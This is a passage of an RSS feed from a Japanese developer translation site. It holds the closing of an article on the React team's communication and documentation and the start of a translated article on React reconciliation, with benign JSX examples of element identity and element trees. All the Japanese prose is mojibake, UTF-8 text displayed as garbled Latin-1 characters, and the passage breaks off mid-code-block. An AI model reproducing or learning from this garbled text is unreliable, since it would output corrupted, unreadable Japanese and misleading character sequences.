<p>ç§ãŸã¡ã¯æœ€çµ‚çš„ã«ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’è‡ªåˆ†ã§ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹ãŸã‚ã®æœ‰ç”¨ãªæŒ‡ç¤ºã‚’æŒã¡ã€ãã‚Œã‚’æœ‰åŠ¹ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¨ã—ã¦èªè­˜ã™ã‚‹ã€åˆç†çš„ãªReactãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®ã‚»ãƒƒãƒˆã«ãŸã©ã‚Šç€ãã¾ã—ãŸã€‚ãã®æ™‚ç‚¹ã«åˆ°é”ã™ã‚‹ã¾ã§ã«æ•°å¹´ã‹ã‹ã£ãŸã“ã¨ã€ãã—ã¦Reactãƒãƒ¼ãƒ ãŒãã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ”¹å–„ã™ã‚‹æ–¹æ³•ã«é–¢ã™ã‚‹ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‹ã‚‰ã®éå¸¸ã«å£°é«˜ãªãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ã‚’æœ¬è³ªçš„ã«ç„¡è¦–ã—ãŸã“ã¨ã¯æ®‹å¿µã§ã™ã€‚ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã€ã‚¢ãƒ—ãƒªã«é©ã—ãŸãƒ„ãƒ¼ãƒ«ã¨ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã‚’é¸æŠã™ã‚‹æ–¹æ³•ã«é–¢ã™ã‚‹ã‚¢ãƒ‰ãƒã‚¤ã‚¹ãŒã‚‚ã£ã¨ã‚ã‚Œã°ã€ä¾ç„¶ã¨ã—ã¦å¤§ã„ã«æ©æµã‚’å—ã‘ã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<p>åŒæ§˜ã«ã€RSCã®ã‚³ãƒ³ã‚»ãƒ—ãƒˆã¨ãƒˆãƒ¬ãƒ¼ãƒ‰ã‚ªãƒ•ã«é–¢ã™ã‚‹å…¬å¼ã®ã‚³ã‚¢ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆæƒ…å ±ã®æ¬ å¦‚ãŒæ··ä¹±ã‚’åŠ©é•·ã—ã¦ãã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã®ãƒˆãƒ”ãƒƒã‚¯ã‚’ã‚«ãƒãƒ¼ã™ã‚‹ã“ã¨ãŒã€äººã€…ã®RSCã«å¯¾ã™ã‚‹ç†è§£ã¨ãã‚Œã«ä¼´ã†è¨€èª¬ã‚’å¤§ããæ”¹å–„ã™ã‚‹ã¨å¼·ãæ„Ÿã˜ã¦ã„ã¾ã™ã€‚</p>
<h2>æœ€å¾Œã«</h2>
<p>ã“ã®è¨˜äº‹ãŒã€ReactãŒã©ã®ã‚ˆã†ã«ã€ãã—ã¦ãªãœã“ã®ã‚ˆã†ã«ç™ºå±•ã—ã¦ããŸã®ã‹ã€Reactã®é–‹ç™ºãƒ—ãƒ­ã‚»ã‚¹ã«ã©ã®ã‚ˆã†ãªå½±éŸ¿ãŒã‚ã‚‹ã®ã‹ã€Reactãƒãƒ¼ãƒ ã®ä¸»ãªç›®æ¨™ã¯ä½•ã‹ã€ãã—ã¦ä»Šæ—¥ã®Reactã®ä½¿ç”¨ãƒ‘ã‚¿ãƒ¼ãƒ³ã¯ã©ã®ã‚ˆã†ãªçŠ¶æ³ã«ã‚ã‚‹ã®ã‹ã€ã¨ã„ã£ãŸå¤šãã®ç–‘å•ã«ç­”ãˆã‚‹ã‚‚ã®ã§ã‚ã‚Œã°å¹¸ã„ã§ã™ã€‚</p>
<p>ã¾ãŸã€Reactãƒãƒ¼ãƒ ã®å‹•æ©Ÿã‚„ç‰¹å®šã®æ–¹å‘ã«æ¨é€²ã™ã‚‹ç†ç”±ã«é–¢ã™ã‚‹æ··ä¹±ã‚„FUDã®ä¸€éƒ¨ã‚’æ‰•æ‹­ã§ããŸã“ã¨ã‚’é¡˜ã£ã¦ã„ã¾ã™ã€‚äººã€…ãŒæŠ€è¡“çš„ãªæ–¹å‘æ€§ã«åŒæ„ã—ãªã„ã“ã¨ã€ã‚ã‚‹ã„ã¯React Server Componentsã‚„ã‚ˆã‚Šå¤§ããªãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¸ã®ç§»è¡ŒãŒå¿…è¦ãªã„ã¨åˆ¤æ–­ã™ã‚‹ã“ã¨ã¯å•é¡Œã‚ã‚Šã¾ã›ã‚“ã€‚ã—ã‹ã—ã€Reactãƒãƒ¼ãƒ ã®æ„å›³ã¯ã“ã“ã§ã‚‚æ­£å½“ã§ç´”ç²‹ãªã‚‚ã®ã§ã™ã€‚</p>
<p>åºƒãä½¿ã‚ã‚Œã¦ã„ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç¶­æŒã—ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®å¤šæ§˜ãªãƒ‹ãƒ¼ã‚ºã‚„ä½¿ç”¨ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æº€ãŸã™ã“ã¨ã¯ã€æœ¬å½“ã«é›£ã—ã„ã“ã¨ã§ã™ã€‚ç§ã¯Reactãƒãƒ¼ãƒ ãŒå…¨ä½“ã¨ã—ã¦è‰¯ã„ä»•äº‹ã‚’ã—ã¦ããŸã¨æ€ã„ã¾ã™ã€‚æ®‹å¿µãªãŒã‚‰ã€ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒä¸ååˆ†ã§ã‚ã£ãŸç‚¹ã‚„ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®å•é¡ŒãŒã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«ãŠã‘ã‚‹å¤šãã®ä¸æº€ã‚„è‹¦æ‚©ã®å¤§ããªè¦å› ã¨ãªã£ã¦ãã¾ã—ãŸã€‚</p>
<p>ä»Šå¾Œã€ç§ãŸã¡ã¯ãã®ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ”¹å–„ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã€ã•ã‚‰ã«ã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã®æ”¹å–„ã«ã‚‚ã£ã¨å¤šãã®ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãŒé–¢ã‚ã£ã¦ãã‚Œã‚‹ã‚ˆã†ã«ãªã‚‹ã“ã¨ã‚’æœŸå¾…ã—ã¦ã„ã¾ã™ã€‚</p>]]></content:encoded></item><item><title><![CDATA[Reactã®å·®åˆ†æ¤œå‡ºå‡¦ç†ï¼šã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®èƒŒå¾Œã«éš ã‚ŒãŸã‚¨ãƒ³ã‚¸ãƒ³]]></title><description><![CDATA[å·®åˆ†æ¤œå‡ºã‚¨ãƒ³ã‚¸ãƒ³ ä»¥å‰æŠ•ç¨¿ã—ãŸè¨˜äº‹ï¼ˆ1ã€2ï¼‰ã§ã€ã®ä»•çµ„ã¿ã¨ã€ã‚³ãƒ³ãƒã‚¸ã‚·ãƒ§ãƒ³ã‚’é€šã˜ã¦ã‚ˆã‚Šã‚¹ãƒãƒ¼ãƒˆã«ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æœ€é©åŒ–ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã—ãŸã€‚ã—ã‹ã—ã€Reactã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’å®Œå…¨ã«ãƒã‚¹ã‚¿ãƒ¼â€¦]]></description><link>https://postd.cc/react-reconciliation-deep-dive/</link><guid isPermaLink="false">https://postd.cc/react-reconciliation-deep-dive/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[React]]></category><pubDate>Fri, 25 Jul 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<h2>å·®åˆ†æ¤œå‡ºã‚¨ãƒ³ã‚¸ãƒ³</h2>
<p>ä»¥å‰æŠ•ç¨¿ã—ãŸè¨˜äº‹ï¼ˆ<a href="https://cekrem.github.io/posts/beyond-react-memo-smarter-performance-optimization/">1</a>ã€<a href="https://cekrem.github.io/posts/react-memo-when-it-helps-when-it-hurts/">2</a>ï¼‰ã§ã€<code class="language-text">React.memo</code>ã®ä»•çµ„ã¿ã¨ã€ã‚³ãƒ³ãƒã‚¸ã‚·ãƒ§ãƒ³ã‚’é€šã˜ã¦ã‚ˆã‚Šã‚¹ãƒãƒ¼ãƒˆã«ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æœ€é©åŒ–ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã—ãŸã€‚ã—ã‹ã—ã€Reactã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’å®Œå…¨ã«ãƒã‚¹ã‚¿ãƒ¼ã™ã‚‹ã«ã¯ã€ã™ã¹ã¦ã‚’å‹•ã‹ã™ã‚¨ãƒ³ã‚¸ãƒ³ã§ã‚ã‚‹ã€Reactã®å·®åˆ†æ¤œå‡ºã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’ç†è§£ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
å·®åˆ†æ¤œå‡ºã¯ã€ReactãŒDOMã‚’ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã—ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãƒ„ãƒªãƒ¼ã¨ä¸€è‡´ã•ã›ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã§ã™ã€‚Reactã®å®£è¨€çš„ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°ã‚’å¯èƒ½ã«ã—ã¦ã„ã‚‹ã®ãŒå·®åˆ†æ¤œå‡ºã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ±‚ã‚ã‚‹ã‚‚ã®ã‚’èª¬æ˜ã™ã‚‹ã¨ã€ReactãŒãã‚Œã‚’åŠ¹ç‡çš„ã«å®Ÿç¾ã™ã‚‹æ–¹æ³•ã‚’æ¢ã—ã¾ã™ã€‚</p>
<h2>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è­˜åˆ¥æƒ…å ±ã¨stateã®æ°¸ç¶šæ€§</h2>
<p>æŠ€è¡“çš„ãªå†…å®¹ã«ã¤ã„ã¦è©±ã—å§‹ã‚ã‚‹å‰ã«ã€ReactãŒã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è­˜åˆ¥æƒ…å ±ï¼ˆãã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚‰ã—ã•ã‚’å½¢æˆã™ã‚‹ç‹¬è‡ªæ€§ï¼‰ã«ã¤ã„ã¦ã©ã®ã‚ˆã†ã«è€ƒãˆã¦ã„ã‚‹ã‹ã‚’ç¤ºã™é©šãã¹ãå‹•ä½œã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚
ä»¥ä¸‹ã®ç°¡å˜ãªãƒ†ã‚­ã‚¹ãƒˆå…¥åŠ›ã®ãƒˆã‚°ãƒ«ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">UserInfoForm</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>isEditing<span class="token punctuation">,</span> setIsEditing<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setIsEditing</span><span class="token punctuation">(</span><span class="token operator">!</span>isEditing<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token punctuation">{</span>isEditing <span class="token operator">?</span> <span class="token string">"Cancel"</span> <span class="token operator">:</span> <span class="token string">"Edit"</span><span class="token punctuation">}</span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">

      </span><span class="token punctuation">{</span>isEditing <span class="token operator">?</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>
          <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>
          <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Enter your name<span class="token punctuation">"</span></span>
          <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>edit-input<span class="token punctuation">"</span></span>
        <span class="token punctuation">/></span></span>
      <span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>
          <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>
          <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Enter your name<span class="token punctuation">"</span></span>
          <span class="token attr-name">disabled</span>
          <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>view-input<span class="token punctuation">"</span></span>
        <span class="token punctuation">/></span></span>
      <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®ãƒ•ã‚©ãƒ¼ãƒ ã‚’æ“ä½œã™ã‚‹ã¨ã€èˆˆå‘³æ·±ã„å‹•ä½œãŒã¿ã‚‰ã‚Œã¾ã™ã€‚ç·¨é›†ç”»é¢ã§å…¥åŠ›æ¬„ã«ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’å…¥åŠ›ã—ã¦ã€Œã‚­ãƒ£ãƒ³ã‚»ãƒ«ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€å†åº¦ã€Œç·¨é›†ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ãŸã¨ãã€å…¥åŠ›ã—ãŸãƒ†ã‚­ã‚¹ãƒˆãŒæ®‹ã£ãŸçŠ¶æ…‹ã«ãªã‚Šã¾ã™ã€‚ã“ã®ç¾è±¡ã¯ã€2ã¤ã®<code class="language-text">input</code>è¦ç´ ãŒç•°ãªã‚‹propsï¼ˆ1ã¤ã¯ç„¡åŠ¹åŒ–ã•ã‚Œã€ã‚¯ãƒ©ã‚¹ãŒç•°ãªã‚Šã¾ã™ï¼‰ã‚’æŒã£ã¦ã„ã‚‹ã«ã‚‚ã‹ã‹ã‚ã‚‰ãšèµ·ã“ã‚Šã¾ã™ã€‚</p>
<p>Reactã¯DOMè¦ç´ ã¨ãã®stateã‚’ä¿æŒã—ã¾ã™ãŒã€ã“ã‚Œã¯ã©ã¡ã‚‰ã®è¦ç´ ã‚‚åŒã˜ã‚¿ã‚¤ãƒ—ï¼ˆ<code class="language-text">input</code>ï¼‰ã§ã‚ã‚Šã€è¦ç´ ãƒ„ãƒªãƒ¼ã®åŒã˜ä½ç½®ã«ã‚ã‚‹ãŸã‚ã§ã™ã€‚Reactã¯è¦ç´ ã‚’ä½œã‚Šç›´ã™ã®ã§ã¯ãªãã€å˜ç´”ã«æ—¢å­˜ã®è¦ç´ ã®propsã‚’æ›´æ–°ã—ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€å®Ÿè£…ã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å¤‰æ›´ã™ã‚‹ã¨ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  isEditing <span class="token operator">?</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Enter your name<span class="token punctuation">"</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>edit-input<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
  <span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>view-only-display<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Name will appear here</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ãã†ã™ã‚‹ã¨ã€ç·¨é›†ãƒ¢ãƒ¼ãƒ‰ã‚’åˆ‡ã‚Šæ›¿ãˆã‚‹ã“ã¨ã§å…¨ãç•°ãªã‚‹è¦ç´ ãŒãƒã‚¦ãƒ³ãƒˆãŠã‚ˆã³ã‚¢ãƒ³ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã¯å¤±ã‚ã‚Œã¾ã™ã€‚</p>
<p>ã“ã®å‹•ä½œã¯ã€Reactã®å·®åˆ†æ¤œå‡ºã®åŸºæœ¬çš„å´é¢ã«ç„¦ç‚¹ã‚’å½“ã¦ã¾ã™ã€‚<strong>ã™ãªã‚ã¡ã€è¦ç´ ã‚¿ã‚¤ãƒ—ã¯è­˜åˆ¥æƒ…å ±ã‚’æ±ºã‚ã‚‹ä¸»è¦ãªè¦å› ã§ã‚ã‚‹</strong>ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã“ã®æ¦‚å¿µã‚’ç†è§£ã™ã‚‹ã“ã¨ãŒã€Reactã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’ãƒã‚¹ã‚¿ãƒ¼ã™ã‚‹ä¸Šã§ã‚«ã‚®ã¨ãªã‚Šã¾ã™ã€‚</p>
<h2>ä»®æƒ³DOMã§ã¯ãªãè¦ç´ ãƒ„ãƒªãƒ¼</h2>
<p>ReactãŒã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã‚’æœ€é©åŒ–ã™ã‚‹ãŸã‚ã«ã€Œä»®æƒ³DOMã€ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã„ã†ã“ã¨ã¯ãŠãã‚‰ãã”å­˜çŸ¥ã§ã—ã‚‡ã†ã€‚ã“ã‚Œã¯æœ‰ç›Šãªãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«ã§ã¯ã‚ã‚Šã¾ã™ãŒã€Reactã®å†…éƒ¨ã‚’è¦ç´ ãƒ„ãƒªãƒ¼ï¼ˆç”»é¢ä¸Šã«è¡¨ç¤ºã•ã‚Œã‚‹å†…å®¹ã‚’ç°¡å˜ã«è¡¨ã—ãŸã‚‚ã®ï¼‰ã¨ã—ã¦è€ƒãˆãŸæ–¹ãŒæ­£ç¢ºã§ã™ã€‚</p>
<p>ä»¥ä¸‹ã®ã‚ˆã†ãªJSXã‚’æ›¸ãã¨ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token function-variable function">Component</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Hello</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">World</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Reactã¯ã“ã‚Œã‚’JavaScriptã®ãƒ—ãƒ¬ãƒ¼ãƒ³ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ãªã‚‹ãƒ„ãƒªãƒ¼æ§‹é€ ã«å¤‰æ›ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'div'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'h1'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token string">'Hello'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token string">'World'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">div</code>ã‚„<code class="language-text">input</code>ã®ã‚ˆã†ãªDOMè¦ç´ ã§ã¯ã€ã€Œtypeã€ã¯æ–‡å­—åˆ—ã§ã™ã€‚ä¸€æ–¹ã€ã‚«ã‚¹ã‚¿ãƒ Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã¯ã€ã€Œã‚¿ã‚¤ãƒ—ã€ã¯å®Ÿéš›ã®é–¢æ•°ã¸ã®å‚ç…§ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token literal-property property">type</span><span class="token operator">:</span> Input<span class="token punctuation">,</span> <span class="token comment">// Reference to the Input function itself</span>
  <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token string">"company-tax-id"</span><span class="token punctuation">,</span>
    <span class="token literal-property property">placeholder</span><span class="token operator">:</span> <span class="token string">"Enter company Tax ID"</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>å·®åˆ†æ¤œå‡ºã®ä»•çµ„ã¿</h2>
<p>ReactãŒUIã‚’ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆï¼ˆstateã®å¤‰æ›´ã¾ãŸã¯å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°å¾Œï¼‰ä»¥ä¸‹ã®ã“ã¨ã‚’è¡Œã„ã¾ã™ã€‚</p>
<ol>
<li>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å‘¼ã³å‡ºã—ã€æ–°ã—ã„è¦ç´ ãƒ„ãƒªãƒ¼ã‚’ä½œæˆã™ã‚‹</li>
<li>ä»¥å‰ã®ãƒ„ãƒªãƒ¼ã¨æ–°ã—ã„ãƒ„ãƒªãƒ¼ã‚’æ¯”è¼ƒã™ã‚‹</li>
<li>å®Ÿéš›ã®DOMã‚’æ–°ã—ã„ãƒ„ãƒªãƒ¼ã¨ä¸€è‡´ã•ã›ã‚‹ãŸã‚ã«å¿…è¦ãªDOMæ“ä½œã‚’å‰²ã‚Šå‡ºã™</li>
<li>ãã‚Œã‚‰ã®æ“ä½œã‚’åŠ¹ç‡çš„ã«å®Ÿè¡Œã™ã‚‹
æ¯”è¼ƒã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¯ä»¥ä¸‹ã®åŸºæœ¬åŸå‰‡ã«å¾“ã„ã¾ã™ã€‚</li>
</ol>
<h3>1. è¦ç´ ã‚¿ã‚¤ãƒ—ãŒè­˜åˆ¥æƒ…å ±ã‚’æ±ºã‚ã‚‹</h3>
<p>Reactã¯ã¾ãšè¦ç´ ã®ã€Œã‚¿ã‚¤ãƒ—ã€ã‚’ç¢ºèªã—ã¾ã™ã€‚ã‚¿ã‚¤ãƒ—ãŒå¤‰ã‚ã‚‹å ´åˆã€Reactã¯ã‚µãƒ–ãƒ„ãƒªãƒ¼å…¨ä½“ã‚’å†æ§‹ç¯‰ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// From this (first render)</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

<span class="token comment">// To this (second render)</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
